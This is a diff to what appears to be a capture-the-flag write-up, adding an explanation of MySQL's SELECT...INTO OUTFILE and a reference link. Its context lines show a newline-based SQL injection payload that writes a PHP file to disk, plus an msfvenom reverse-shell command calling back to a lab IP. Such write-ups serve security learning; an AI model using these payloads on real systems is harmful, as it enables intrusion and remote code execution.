@@ -340,7 +340,7 @@ This can be confirmed by setting the id parameter to `%0A2`, which loads the sam
 
 Furthermore, given that PDO is used for preparing SQL queries, it's worth noting that PDO [permits consecutive multiple queries](https://blog.ulf-wendel.de/2008/pdo_mysqlnd-insecure-multi-statements-and-pdostatementnextrowset/) separated by a new line.
 
-A payload like this (URL-encoded new line followed by a SQL query to write to a file) should successfully bypass the regex check and write code to execute `phpinfo()` at the specified location. It's interesting that the `/tmp` directory didn't work for writing, but `/dev/shm` functions as expected for some reason.
+A payload like this (URL-encoded new line followed by a SQL query to write to a file) should successfully bypass the regex check and write code to execute `phpinfo()` at the specified location using mysql's `SELECT...INTO OUTFILE`. It's interesting that the `/tmp` directory didn't work for writing, but `/dev/shm` functions as expected for some reason.
 
 ```bash
 %0A';select '<?php phpinfo();?>' into outfile '/dev/shm/poc.php' #2
@@ -646,5 +646,6 @@ msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f elf-so -
 - [PHP Tricks - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#new-line-bypass)
 - [php - PDO support for multiple queries (PDO_MYSQL, PDO_MYSQLND) - Stack Overflow](https://stackoverflow.com/questions/6346674/pdo-support-for-multiple-queries-pdo-mysql-pdo-mysqlnd)
 - [PDO_MYSQLND: Mighty multiple-queries and PDOStatement - Ulf Wendel](https://blog.ulf-wendel.de/2008/pdo_mysqlnd-insecure-multi-statements-and-pdostatementnextrowset/)
+- [SELECT INTO OUTFILE - MariaDB Knowledge Base](https://mariadb.com/kb/en/select-into-outfile/)
 - [Abusing missing libraries for Privilege Escalation | by Nishant Sharma | Pentester Academy Blog](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
 - [Exploiting Shared Library Misconfigurations](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)
